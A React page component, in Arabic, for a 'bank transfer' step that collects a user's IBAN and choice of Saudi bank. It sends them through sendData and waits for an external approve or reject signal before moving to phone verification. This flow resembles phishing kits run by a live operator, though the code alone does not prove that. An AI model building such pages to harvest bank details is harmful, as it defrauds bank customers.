import { useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { useLocation } from "wouter";
import PageLayout from "@/components/layout/PageLayout";
import WaitingOverlay from "@/components/WaitingOverlay";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import {
  sendData,
  isFormApproved,
  isFormRejected,
  navigateToPage,
} from "@/lib/store";

const banks = [
  { value: "al-rajhi", label: "مصرف الراجحي", icon: "/images/banks/al-rajhi-banking-and-investment-corp.png" },
  { value: "al-ahli", label: "البنك الأهلي", icon: "/images/banks/national-commercial-bank.png" },
  { value: "al-awwal", label: "بنك الأول", icon: "/images/banks/saudi-awwal-bank.png" },
  { value: "riyad", label: "بنك الرياض", icon: "/images/banks/riyad-bank.png" },
  { value: "al-bilad", label: "بنك البلاد", icon: "/images/banks/bank-albilad.png" },
  { value: "al-inma", label: "مصرف الإنماء", icon: "/images/banks/alinma-bank.png" },
];

const schema = z.object({
  iban: z.string().min(1, "رقم الآيبان مطلوب"),
  bank: z.string().min(1, "البنك مطلوب"),
});

type FormData = z.infer<typeof schema>;

export default function BankTransfer() {
  const [, navigate] = useLocation();

  const {
    register,
    handleSubmit,
    setValue,
    reset,
    formState: { errors },
  } = useForm<FormData>({
    resolver: zodResolver(schema),
    defaultValues: {
      iban: "",
      bank: "",
    },
  });

  // Emit page enter
  useEffect(() => {
    navigateToPage("تحويل بنكي");
  }, []);

  // Handle form approval
  useEffect(() => {
    if (isFormApproved.value) {
      navigate("/phone-verification");
    }
  }, [isFormApproved.value, navigate]);

  // Handle form rejection
  useEffect(() => {
    if (isFormRejected.value) {
      reset();
    }
  }, [isFormRejected.value, reset]);

  const onSubmit = (data: FormData) => {
    const bankName = banks.find((b) => b.value === data.bank)?.label;

    sendData({
      data: {
        "رقم الآيبان": data.iban,
        "البنك": bankName,
      },
      current: "تحويل بنكي",
      nextPage: "توثيق رقم الجوال",
    });
  };

  return (
    <PageLayout variant="default">
      <WaitingOverlay />

      <div className="bg-white rounded-2xl shadow-xl p-6">
        {/* Header */}
        <div className="text-center mb-6">
          <div className="w-16 h-16 bg-primary/10 rounded-full flex items-center justify-center mx-auto mb-4">
            <svg
              className="w-8 h-8 text-primary"
              fill="none"
              stroke="currentColor"
              viewBox="0 0 24 24"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M8 14v3m4-3v3m4-3v3M3 21h18M3 10h18M3 7l9-4 9 4M4 10h16v11H4V10z"
              />
            </svg>
          </div>
          <h1 className="text-xl font-bold text-gray-800 mb-2">التحويل البنكي</h1>
          <p className="text-gray-500 text-sm">
            أدخل بيانات حسابك البنكي
          </p>
        </div>

        <form onSubmit={handleSubmit(onSubmit)} className="space-y-4">
          {/* Bank Selection */}
          <div className="space-y-2">
            <Label>اختر البنك</Label>
            <Select onValueChange={(v) => setValue("bank", v)}>
              <SelectTrigger>
                <SelectValue placeholder="اختر البنك" />
              </SelectTrigger>
              <SelectContent>
                {banks.map((bank) => (
                  <SelectItem key={bank.value} value={bank.value}>
                    <div className="flex items-center gap-2">
                      <img
                        src={bank.icon}
                        alt={bank.label}
                        className="w-6 h-6"
                      />
                      <span>{bank.label}</span>
                    </div>
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
            {errors.bank && (
              <p className="text-red-500 text-xs">{errors.bank.message}</p>
            )}
          </div>

          {/* IBAN */}
          <div className="space-y-2">
            <Label htmlFor="iban">رقم الآيبان (IBAN)</Label>
            <Input
              id="iban"
              placeholder="SA00 0000 0000 0000 0000 0000"
              {...register("iban")}
            />
            {errors.iban && (
              <p className="text-red-500 text-xs">{errors.iban.message}</p>
            )}
          </div>

          {/* Submit Button */}
          <Button type="submit" className="w-full" size="lg">
            متابعة
          </Button>
        </form>
      </div>
    </PageLayout>
  );
}
